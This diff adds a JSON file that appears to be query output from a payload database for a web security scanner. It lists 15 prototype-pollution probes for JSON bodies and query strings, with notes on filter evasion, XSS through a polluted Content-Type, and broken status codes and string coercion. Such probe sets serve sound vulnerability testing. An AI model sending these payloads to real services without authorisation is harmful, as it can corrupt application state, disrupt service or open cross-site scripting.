@@ -1,0 +1,284 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "prototype_pollution"
+  },
+  "count": 15,
+  "results": [
+    {
+      "id": "33b8f7d1fcb20a6a",
+      "payload": "{\"__proto__\": {\"polluted\": \"ensphere-pp-probe\"}}",
+      "technique": "proto_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Basic __proto__ pollution probe. If a subsequent response includes 'polluted' key with value 'ensphere-pp-probe', the merge is unsafe.",
+      "source": "ensphere",
+      "tags": [
+        "detection",
+        "merge",
+        "probe",
+        "proto"
+      ]
+    },
+    {
+      "id": "6d4a5e8ac6376a0d",
+      "payload": "{\"__proto__\": {\"toString\": \"ensphere-pp-tostring\"}}",
+      "technique": "json_merge",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Pollute Object.prototype.toString. Breaks string coercion globally; objects return the injected value instead of [object Object].",
+      "source": "ensphere",
+      "tags": [
+        "coercion",
+        "probe",
+        "proto",
+        "toString"
+      ]
+    },
+    {
+      "id": "d2db67157973cb37",
+      "payload": "{\"__proto__\": {\"valueOf\": 1}}",
+      "technique": "json_merge",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Pollute Object.prototype.valueOf. Breaks numeric coercion; comparisons and arithmetic on plain objects produce unexpected results.",
+      "source": "ensphere",
+      "tags": [
+        "coercion",
+        "probe",
+        "proto",
+        "valueOf"
+      ]
+    },
+    {
+      "id": "0e0b6f2f9c1dc404",
+      "payload": "{\"__proto__\": {\"json_parsed\": true}}",
+      "technique": "json_merge",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "JSON.parse preserves __proto__ as a plain key. Pollution occurs when the parsed result is passed to an unsafe merge or assign utility that walks all keys including __proto__.",
+      "source": "ensphere",
+      "tags": [
+        "detection",
+        "json_parse",
+        "merge",
+        "proto"
+      ]
+    },
+    {
+      "id": "131e73f240578c30",
+      "payload": "__proto__.polluted=ensphere-pp-dot",
+      "technique": "proto_assignment",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Dot-notation __proto__ pollution via query parameter. Works with parsers that expand dot paths into nested objects (e.g., qs with allowDots).",
+      "source": "ensphere",
+      "tags": [
+        "dot_notation",
+        "proto",
+        "qs",
+        "query"
+      ]
+    },
+    {
+      "id": "1e4750c850b9f389",
+      "payload": "{\"a\": {\"b\": {\"__proto__\": {\"polluted\": \"ensphere-pp-nested2\"}}}}",
+      "technique": "json_merge",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Two-level nested __proto__. Deeper nesting evades shallow sanitisation that only checks top-level keys.",
+      "source": "ensphere",
+      "tags": [
+        "depth_2",
+        "merge",
+        "nested",
+        "proto"
+      ]
+    },
+    {
+      "id": "221cfb2b2eed1a12",
+      "payload": "{\"__proto__\": {\"polluted\": \"ensphere-pp-merge\"}, \"constructor\": {\"prototype\": {\"polluted2\": \"ensphere-pp-merge2\"}}}",
+      "technique": "json_merge",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Dual-path pollution probe. Tests both __proto__ and constructor.prototype in one request. If either path survives sanitisation the prototype is polluted.",
+      "source": "ensphere",
+      "tags": [
+        "constructor",
+        "dual_path",
+        "merge",
+        "probe",
+        "proto"
+      ]
+    },
+    {
+      "id": "3a9cae8fbbbe5dc5",
+      "payload": "{\"__proto__\": {\"content-type\": \"text/html\"}}",
+      "technique": "json_merge",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "header_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Pollute default Content-Type header. If Express or middleware reads content-type from a merged config, responses may be served as HTML, enabling XSS.",
+      "source": "ensphere",
+      "tags": [
+        "content_type",
+        "express",
+        "header",
+        "proto",
+        "xss"
+      ]
+    },
+    {
+      "id": "4ab186bd8539c816",
+      "payload": "{\"__proto__\": {\"__proto__\": {\"deep_polluted\": \"ensphere-pp-double\"}}}",
+      "technique": "json_merge",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Double __proto__ nesting. Targets merge functions that strip one layer of __proto__ but not a second, allowing the inner key to pollute Object.prototype.",
+      "source": "ensphere",
+      "tags": [
+        "double_proto",
+        "evasion",
+        "merge",
+        "proto"
+      ]
+    },
+    {
+      "id": "656fa1f398c37633",
+      "payload": "{\"constructor\": {\"prototype\": {\"polluted\": \"ensphere-pp-ctor\"}}}",
+      "technique": "constructor_pollution",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Pollution via constructor.prototype path. Bypasses filters that block __proto__ but not the constructor chain.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "constructor",
+        "merge",
+        "prototype"
+      ]
+    },
+    {
+      "id": "a0e3ac1b4cd08bb5",
+      "payload": "{\"a\": {\"__proto__\": {\"polluted\": \"ensphere-pp-nested1\"}}}",
+      "technique": "json_merge",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Single-level nested __proto__. Tests recursive merge functions that descend into child objects before hitting __proto__.",
+      "source": "ensphere",
+      "tags": [
+        "depth_1",
+        "merge",
+        "nested",
+        "proto"
+      ]
+    },
+    {
+      "id": "afeb444a6071e5f6",
+      "payload": "__proto__[polluted]=ensphere-pp-qproto",
+      "technique": "proto_assignment",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Direct __proto__ pollution via query parameter. Express qs (extended mode) parses bracket notation into nested objects including __proto__.",
+      "source": "ensphere",
+      "tags": [
+        "express",
+        "proto",
+        "qs",
+        "query"
+      ]
+    },
+    {
+      "id": "c1c01353b6eb232f",
+      "payload": "constructor[prototype][polluted]=ensphere-pp-query",
+      "technique": "constructor_pollution",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "constructor.prototype pollution via query string bracket notation. Express qs parser builds nested objects from bracket syntax.",
+      "source": "ensphere",
+      "tags": [
+        "constructor",
+        "express",
+        "prototype",
+        "qs",
+        "query"
+      ]
+    },
+    {
+      "id": "e917a306b3cfba5a",
+      "payload": "{\"x\": {\"y\": {\"z\": {\"__proto__\": {\"polluted\": \"ensphere-pp-nested3\"}}}}}",
+      "technique": "json_merge",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Three-level nested __proto__. Targets deeply recursive merge utilities such as lodash defaultsDeep.",
+      "source": "ensphere",
+      "tags": [
+        "depth_3",
+        "lodash",
+        "merge",
+        "nested",
+        "proto"
+      ]
+    },
+    {
+      "id": "fa7d73430e8301b3",
+      "payload": "{\"__proto__\": {\"status\": 510}}",
+      "technique": "json_merge",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Pollute default HTTP status code. Express res.status() may pick up the polluted value if status is read from a merged options object.",
+      "source": "ensphere",
+      "tags": [
+        "dos",
+        "express",
+        "proto",
+        "status"
+      ]
+    }
+  ]
+}
